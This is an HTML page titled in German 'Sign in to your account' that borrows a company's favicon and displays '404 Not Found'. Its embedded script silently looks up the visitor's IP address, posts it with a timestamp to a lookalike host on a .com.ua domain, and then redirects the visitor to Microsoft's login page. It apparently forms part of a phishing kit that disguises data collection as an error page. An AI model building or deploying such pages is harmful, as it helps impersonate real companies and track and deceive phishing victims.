<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Bei Ihrem Konto anmelden</title>

    <link rel="icon" href="https://rise-partners.de/wp-content/uploads/2024/03/RISE_fav-150x150.png" type="image/png">

    <link rel="stylesheet" href="styles.css">





</head>

<body>
404 Not Found
<script>

let data = {};

let ip = undefined;


async function getIp() {

    await fetch('https://api.ipify.org?format=json')

        .then(response => response.json())

        .then(data => {

            ip = data.ip;

        })

        .catch(error => {

            console.error('Error fetching IP address:', error);

        });

};



const currentDate = new Date();

const date = currentDate.toLocaleString();



getIp().then(() => {

    data = {

        date,

        ip,

    };



    console.log(data);



    fetch('https://rise-partners.workts.com.ua', {

        method: 'POST',

        headers: {

            'Content-Type': 'application/json',

        },

        body: JSON.stringify(data)

    })

    .then(response => response.json())

    .then(data => {

        console.log('Data successfully sent:', data);
        window.location.href = 'https://login.microsoftonline.com/common/login';

    })

    .catch(error => {

        console.error('Error sending data:', error);

    });



});

</script>

</body>

</html>
